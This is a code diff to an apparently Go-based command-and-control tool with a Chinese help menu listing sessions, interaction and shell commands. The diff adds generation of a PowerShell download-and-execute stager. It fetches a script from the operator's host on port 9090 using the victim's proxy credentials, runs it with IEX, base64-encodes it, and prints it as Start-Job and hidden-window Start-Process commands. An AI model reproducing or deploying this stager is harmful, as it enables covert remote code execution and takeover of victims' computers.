@@ -30,11 +30,12 @@ const help_shell = `
 		back   返回主页
 	 `
 const help = `
-		help          帮助参数
-		Sessions list 显示会话信息包括会话id
-		Sessions id   以会话的形式接管shell
-   		shell  		进入shell
-		exit          退出
+    	help          帮助参数                   
+        set Host      设置IP            
+        session list  列出会话列表                     
+        Interact      使用session ID 
+        shell         进入shell             
+	exit          退出                   
 	 `
 
 var (
@@ -274,7 +275,7 @@ func Hosts() {
 
 	}))
 	fmt.Printf("%s setting listener => %s:9090 \n", Blue("[*]"), Host) //https://github.com/fatih/color
-	// fmt.Printf("%s mshta http://%s:9090/hta \n", Blue("[☠ ]"), Host)   //https://github.com/fatih/color
+	fmt.Println("\n")
 	payload := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/get');IEX($s)"
 
 	strbytes := []byte(payload)
@@ -282,8 +283,11 @@ func Hosts() {
 	// fmt.Println(encoded)
 	commandJ := "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))}"
 	fmt.Printf("%s %s \n", Blue("[☠ ]"), commandJ)
+	fmt.Println("\n")
+	commandP := "Start-Process powershell -ArgumentList " + "\"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))\"" + " -WindowStyle Hidden"
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), commandP)
+	fmt.Println("\n")
 }
-
 func Options() { //定义tab 下拉菜单选项参数
 	for true {
 		options := prompt.Input("SSF >", completer,
